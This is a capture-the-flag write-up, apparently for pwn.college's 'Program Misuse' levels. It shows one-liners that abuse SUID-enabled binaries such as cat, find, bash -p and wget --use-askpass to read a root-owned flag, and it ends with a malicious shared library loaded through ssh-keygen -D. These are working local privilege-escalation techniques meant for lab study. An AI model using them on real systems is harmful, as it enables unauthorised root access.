<div align="center">
    <h1 style="color:#008000;"> Program Misuse </h1>
</div>

Most of these challenges can be solved with one liners, thus I will showcase the solutions below. I will not go into much details, the program runs the given commands with `SUID`. The purpose is for players to understand how the commands work. To getter a better understanding of each command, run on command line `man func_name`, e.g. `man cat`. Always run the given executable at `/challenge` to set the `sticky bit` to each command.

<div align="center">
    <h1> Commands to read the context of a file </h1> 
</div>


### Level 1 - cat

When we run the challenge, we get the following message: 

```bash 
hacker@program-misuse~level1:/$ ./challenge/babysuid_level1
Welcome to ./challenge/babysuid_level1!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/cat.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./challenge/babysuid_level1) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/cat!
```

As the challenge says, when we run it, it sets it `SUID` bit on `/usr/bin/cat`, meaning we can run `cat` as privileged user. After we run the program, we can use `cat` to read the `flag`.

```bash
$ ./challenge/babysuid_level1 2&>/dev/null && cat flag
```

### Level 2 - more

We will use the same technique as before.

```bash
$ ./babysuid_level2 2&>/dev/null && /usr/bin/more /flag
```

### Level 3 - less

Same as before.

```bash
$ ./babysuid_level3 2&>/dev/null && /usr/bin/more /flag
```

### Level 4 - tail

Same as before.

```bash
$ ./babysuid_level4 2&>/dev/null && /usr/bin/tail /flag
```

### Level 5 - head

```bash
$ ./babysuid_level5 2&>/dev/null && /usr/bin/head /flag
```

<center>
    <h1>
Editors  
    </h1> 
</center>


### Level 6 - sort

```bash
$ ./babysuid_level6 2&>/dev/null && /usr/bin/sort /flag
```

The following levels demonstrate how to open a file via some editors.

### Level 7 - vim

Run `vim /flag` to get the flag.

### Level 8 - emacs

```bash
$ emacs /flag
```

### Level 9 - nano

```bash
$ nano /flag
```

<div align="center">
    <h1> Analyze the output of the commands </h1> 
</div>


### Level 10 - rev

From the `man` page of `rev`. 

>     The rev utility copies the specified files to standard output, reversing the order of characters in every line. If no files are specified, standard input is read.

To get the output in the correct order, we `pipe` the output of the rev command to another rev command. 

```bash
$ rev /flag | rev
```

### Level 11 - od

This command dumps files in `octal` and other formats.

```bash
$ od -A n -t x1 /flag | awk '{$1=$1; print}' | sed 's/ //g' | xxd -r -p
```

Let me explain the components:

- `od -A n -t x1 /flag`: This command dumps the contents of `/flag` in hexadecimal format, one byte per line.
- `awk '{$1=$1; print}'`: This command      	 removes leading whitespaces that `od` might introduce in the output.
- `sed 's/ //g'`: This command removes any spaces between the hex bytes.
- `xxd -r -p`: This command converts the resulting stream of hex bytes back into binary, then the binary is interpreted as ASCII characters.

### Level 12 - hd

This command displays file contents in `hexadecimal`, `decimal`, `octal`, or `ascii`.

```bash
$ hd /flag
00000000  70 77 6e 2e 63 6f 6c 6c  65 67 65 7b 49 6c 67 4a  |pwn.college{IlgJ|
00000010  6c 67 67 6e 6f 41 50 57  48 6c 48 6e 6e 79 2d 42  |lggnoAPWHlHnny-B|
00000020  43 5f 39 43 53 53 6d 2e  51 58 30 55 54 4d 73 4d  |C_9CSSm.QX0UTMsM|
00000030  44 4e 33 49 7a 57 7d 0a                           |DN3IzW}.|
00000038
```

### Level 13 - xxd

This command makes a `hexdump` or do the reverse.

```bash
$ xxd /flag
00000000: 7077 6e2e 636f 6c6c 6567 657b 674c 7866  pwn.college{gLxf
00000010: 3364 3043 654f 4342 5564 5574 535a 4c77  3d0CeOCBUdUtSZLw
00000020: 5271 4837 5834 312e 5158 3155 544d 734d  RqH7X41.QX1UTMsM
00000030: 444e 3349 7a57 7d0a                      DN3IzW}.
```

### Level 14 - base32

This command `encodes`/`decode` data and prints to standard output.

```bash
$ base32 /flag | base32 -d
```

### Level 15 - base64

Same as before but with different encoding.

```bash
$ base64 /flag | base64 -d
```

### Level 16 - split

From the `man` page of `split`:

> NAME
>        split - split a file into pieces
>
> SYNOPSIS
>        split [OPTION]... [FILE [PREFIX]]
>
> DESCRIPTION
>        Output pieces of FILE to PREFIXaa, PREFIXab, ...; default size is 1000 lines, and default PREFIX is 'x'.

So, it will split the flag to `PREFIXaa` and `PREFIXab`. Reading the content of `xaa` will give us the flag.

```bash
$ split /flag && cat xaa 
```

<div align="center">
    <h1> Archive formats </h1> 
</div>


### Level 17 - gzip

From the `man` page of `gzip`:

> -c --stdout --to-stdout
>           Write  output on standard output; keep original files unchanged.  If there are several input files, the output consists of a sequence of independently compressed members. To obtain better compression, concatenate all input files before compressing them.
>
> -d --decompress --uncompress
>           Decompress.

```bash
$ gzip -c /flag | gzip -d
```

### Level 18 - bzip2

From the `man` page of `gzip`.

```bash
$ bzip2 -c /flag | bzip2 -d
```

### Level 19 - zip

```bash
$ zip flag.zip /flag 2&>/dev/null && strings flag.zip | grep pwn
```

### Level 20 - tar

```bash
$ tar -cf flag.tar /flag && strings flag.tar | grep pwn
```

### Level 21 - ar

```bash
$ ar -r flag.a /flag && strings flag.a | grep pwn
```

### Level 22 - cpio

```bash
$ find /flag | cpio -o
```

<div align="center">
    <h1> Execute other commands to read flag </h1> 
</div>


### Level 23 - genisoimage

```bash
$ genisoimage -sort /flag | grep pwn
```

### Level 24 - env

From the `man` page of `env`:

> NAME
>        env - run a program in a modified environment

We will use `env` to execute `head` and check the content of /`flag`.

```bash
$ env head /flag 
```

### Level 25 - find

There is a variety of ways for this, from spawning shell, use `head`, `more` or whatever we learned from the first challenges to print the content of `/flag`.

```bash
$ find /flag -exec /usr/bin/cat /flag \;
```

### Level 26 - make

With a bit of bash magic, we can come up with something like this:

```bash
$ make -s -C / -f /dev/null --eval="$(echo -e 'print_flag:\n\t@cat /flag\n') print_flag"
```

### Level 27 - nice

```bash
$ nice cat /flag
```

### Level 28 - timeout

```bash
$ timeout 69 cat /flag
```

### Level 29 - stdbuf

```bash
$ stdbuf -o 0 cat /flag
```

### Level 30 - setarch

```bash
$ setarch --uname-2.6 cat /flag
```

### Level 31 - watch

```bash
$ watch -x cat /flag
```

### Level 32 - socat

```bash
$ socat -u FILE:/flag -
```

The output will be really long, go up right after the command to get the flag.

- `-u` ensures that `socat` operates in unidirectional mode.
- `FILE:/flag` specifies that `socat` should read from the `/flag` file.
- `-` at the end instructs `socat` to send the contents to standard output.

<div align="center">
    <h1> Programming </h1> 
</div>

Personally, I wouldn't categorize these challenges as "programming", but that's what the Dojo suggests.

### Level 33 - whiptail

```bash
$ whiptail --textbox /flag 20 60
```

### Level 34 - awk

```bash
$ awk 'BEGIN { while (getline < "/flag") print }'
```

### Level 35 - sed

```bash
$ sed -n 'p' /flag
```

- `-n` suppresses automatic printing of pattern space.
- `'p'` specifies the pattern to match, which effectively prints every line.
- `/flag` is the file you want to read.

### Level 36 - ed

Open the file with `ed` editor and write `p` to print its content.

```bash
$ ed /flag
56
p
```

<div align="center">
    <h1> Permissions </h1> 
</div>

### Level 37 - chown

Change the ownership of `/flag` from `root` to `hacker` so we are able to read it.

```bash
$ chown hacker /flag && cat /flag
```

### Level 38 - chmod

Change the files mod bits to `read` so we are able to read it.

```bash
$ chmod +r /flag && cat /flag
```

### Level 39 - cp

```bash
cp --backup --no-preserve=all /flag ./flag.txt && cat flag.txt
```

### Level 40 - mv

This one was a bit tricky. First of all we run the program to set `SUID` to `/usr/bin/mv`. Then, we `mv` the `/usr/bin/cat` to `/usr/bin/mv`. After that, we run the program again to set the `SUID`, but now it sets the `sticky bit` to `cat` instead of `mv`.

```bash
$  mv /usr/bin/cat /usr/bin/mv && ./babysuid_level40 && mv /flag
Welcome to ./babysuid_level40!

This challenge is part of a series of programs that
let you get the flag by doing tricks with permissions.

I just set the SUID bit on /usr/bin/mv.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level40) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/mv!
pwn.college{IsS_qm6D7HBmDndCzMOq0jD5n7S.QXygTMsMDN3IzW}
```

<div align="center">
    <h1> Programming Languages </h1> 
</div>

### Level 41 - perl

After we enter the command, we need to press `enter` to get the flag.

```bash
$ LC_ALL=en_US.UTF-8 perl -pe 'BEGIN { open(FILE, "<", "/flag") or die "Cannot open file /flag: $!"; } print while <FILE>; close(FILE);' 
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = (unset),
        LC_ALL = "en_US.UTF-8",
        LC_CTYPE = "C.UTF-8",
        LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").

pwn.college{0ZaXAqqFTl-8p4w1F9eP3TcYcig.QXzgTMsMDN3IzW
```

### Level 42 - python

We can simply do `python /flag` to get the flag as error.

### Level 43 - ruby

Same as before

```bash
$ ruby /flag
/flag:1: syntax error, unexpected local variable or method, expecting '}'
pwn.college{06kxXyrzYst2E0pz5a-46koeJJS.QX1gTMsMDN3IzW}
```

### Level 44 - bash

From the `man` page of `bash`:

>     If  the  shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell  functions  are  not  inherited  from  the  environment, the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id.  If the -p option is supplied at invocation, the startup behavior is the same, but  the  effective user id is not reset.

```bash
$ bash -pi
```

After that, we simply `cat /flag` to get the flag.

<div align="center">
    <h1> Commands that weren't supposed to read files </h1> 
</div>

### Level 45 - date

```bash
$ date -f /flag
```

### Level 46 - dmesg

From the `man` page of `dmesg`:

>     -F, --file file
>            Read the syslog messages from the given file. Note that -F does not support messages in kmsg format.The old syslog format is supported only.

```bash
$ dmesg -F /flag
```

### Level 47 - wc

From the `man` page of `wc`: 

>--files0-from=F
>        read  input  from  the files specified by NUL-terminated names in file F; If F is - then read names from standard
>        input

```bash
$ wc --files0-from=/flag
```

### Level 48 - gcc

From the `man` page of `gcc`:

> -x language
>            Specify explicitly the language for the following input files (rather than letting the compiler choose a default
>            based on the file name suffix).  This option applies to all following input files until the next -x option.
>            Possible values for language are:
>
> ​		c  c-header  cpp-output
> ​		c++  c++-header  c++-system-header c++-user-header c++-cpp-output
> ​		objective-c  objective-c-header  objective-c-cpp-output
> ​		objective-c++ objective-c++-header objective-c++-cpp-output
> ​		assembler  assembler-with-cpp
> ​		ada
> ​		d
> ​		f77  f77-cpp-input f95  f95-cpp-input
> ​		go
> ​		brig

```bash
$ gcc -x c /flag 
```

### Level 49 - as

From the `man` page of `as`: 

> OPTIONS
>        @file
>            Read command-line options from file. 

```bash
$ as @/flag
```

### Level 50 - wget

This was the most difficult task so far.

```bash
F=$(mktemp) && chmod +x $F && echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$F && wget --use-askpass=$F 0
cat /flag
```

1. `F=$(mktemp)`: This creates a temporary file and assigns its path to the variable `$F`.
2. `chmod +x $F`: This gives execute permissions to the temporary file.
3. `echo -e ‘#!/bin/sh -p\n/bin/sh -p 1>&0’ > $F`: This writes a shell script to the temporary file. The script executes `/bin/sh` with elevated privileges and redirects its output to file descriptor 0, effectively allowing interactive shell access.
4. `wget --use-askpass=$F 0`: This attempts to use the temporary file as an askpass program for `wget`.

### Level 51 - ssh-keygen

First we need to create a `.c` file and then compile it to an `.so` shared library. We do that because we can exploit that challenge via `ssh-keygen -D`. From the `man` page of `ssh-keygen`:

>     -D pkcs11
>                  Download the public keys provided by the PKCS#11 shared library pkcs11.  When used in combination with -s, this option indicates that a CA key resides in a PKCS#11 token (see the CERTIFICATES section for details).
>     
>     It is possible to sign using a CA key stored in a PKCS#11 token by providing the token library using -D and identifying the CA key by providing its public half as an argument to -s:
>     
>            $ ssh-keygen -s ca_key.pub -D libpkcs11.so -I key_id user_key.pub

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void C_GetFunctionList() { sendfile(1, open("/flag", 0), 0, 4096); }
```

Now, we need to compile the program to `.so` and then perform the `ssh-keygen -D`.

```bash
$ gcc -shared -o w3t.so w3t.c && ssh-keygen -D ./w3t.so
```

